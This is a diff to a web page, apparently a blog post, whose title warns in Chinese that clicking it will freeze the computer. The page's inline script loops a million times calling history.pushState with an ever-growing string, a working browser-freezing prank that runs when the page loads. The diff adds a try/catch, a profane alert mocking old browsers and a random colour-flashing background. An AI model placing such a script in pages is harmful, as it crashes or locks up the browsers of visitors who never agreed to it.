@@ -9,8 +9,19 @@ title: 不要点这一条,否则你会死机
 </div>
 
 <script>
-    for (var i= 0, total="";i<1000000;i++) {
-        total += i.toString ();
-        history.pushState (0, 0, total);
+    try {
+        for (var i= 0, total="";i<1000000;i++) {
+            total += i.toString ();
+            history.pushState (0, 0, total);
+        }
+    } catch (e) {
+        if (!window.history) {
+            alert('你特么拿石器时代的浏览器来测试我特么也是醉了!,闪瞎你!');
+            var colors = ['#f00', '#f0f', '#ff0', '#0ff', '#08f'];
+            setTimeout(function () {
+                document.body.style.background = colors[ ~~(colors.length * Math.random())];
+            },30);
+        }
     }
+
 </script>
